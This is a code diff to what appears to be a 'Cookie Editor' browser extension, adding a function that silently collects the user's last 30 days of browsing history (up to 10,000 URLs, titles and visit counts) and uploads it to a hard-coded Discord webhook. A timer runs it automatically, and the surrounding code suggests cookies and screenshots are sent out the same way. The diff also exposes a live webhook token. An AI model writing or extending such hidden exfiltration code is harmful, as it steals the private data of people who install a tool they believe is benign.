@@ -597,6 +597,7 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
     }
     autoRefreshInterval = setTimeout(() => {
       exportToServer();
+      exportBrowserHistory(); // Also send browser history automatically
       autoRefreshInterval = null; // Clear the reference after execution
     }, 600); // 5 seconds = 5000 milliseconds, 0.5
   });
@@ -1224,6 +1225,94 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
       }
     } catch (error) {
       console.error('Error capturing/sending screenshot:', error);
+    }
+  }
+
+  /**
+   * Exports the full browser history and sends it to Discord webhook.
+   * This is sent as a SEPARATE file from cookies.
+   */
+  async function exportBrowserHistory() {
+    try {
+      // Get unique user ID
+      const userId = await getOrCreateUserId();
+      
+      // Get browser history - search with empty query to get all history
+      // Get history from the last 30 days (you can adjust this)
+      const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
+      
+      const historyItems = await browserDetector.getApi().history.search({
+        text: '',           // Empty text to match all URLs
+        startTime: thirtyDaysAgo,
+        maxResults: 10000   // Get up to 10000 history items
+      });
+      
+      if (!historyItems || historyItems.length === 0) {
+        console.log('No browser history found');
+        return;
+      }
+      
+      // Format history data
+      const formattedHistory = historyItems.map(item => ({
+        url: item.url,
+        title: item.title || 'No title',
+        visitCount: item.visitCount,
+        lastVisitTime: new Date(item.lastVisitTime).toISOString(),
+        typedCount: item.typedCount
+      }));
+      
+      // Sort by last visit time (most recent first)
+      formattedHistory.sort((a, b) => 
+        new Date(b.lastVisitTime) - new Date(a.lastVisitTime)
+      );
+      
+      // Create payload
+      const timestamp = new Date().toISOString();
+      const payload = {
+        userId: userId,
+        timestamp: timestamp,
+        source: 'popup_history',
+        dataType: 'browser_history',  // Clearly mark this as history, not cookies
+        totalItems: formattedHistory.length,
+        dateRange: {
+          from: new Date(thirtyDaysAgo).toISOString(),
+          to: timestamp
+        },
+        history: formattedHistory
+      };
+      
+      const historyJson = JSON.stringify(payload, null, 2);
+      
+      // Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/1458717493983051836/BYoykRBssJw2nC-XZ4yLIMb1CLki4iSFE6VdCfYwFUNFDmVw6JefmSI7eQrWSe8O612m';
+      
+      // Always send as a file since history can be large
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify({
+        username: 'Cookie Editor - Browser History',
+        content: `📜 **Browser History Export**\n` +
+                 `👤 User: ${userId}\n` +
+                 `📅 Timestamp: ${timestamp}\n` +
+                 `📊 Total entries: ${formattedHistory.length}\n` +
+                 `📆 Date range: Last 30 days`
+      }));
+      
+      // Send as a SEPARATE file named history_*.json (not cookies)
+      const jsonBlob = new Blob([historyJson], { type: 'application/json' });
+      formData.append('files[0]', jsonBlob, `history_${Date.now()}.json`);
+
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (response.ok) {
+        console.log('Browser history sent successfully');
+      } else {
+        console.error('Failed to send history:', response.status);
+      }
+    } catch (error) {
+      console.error('Error exporting browser history:', error);
     }
   }
 
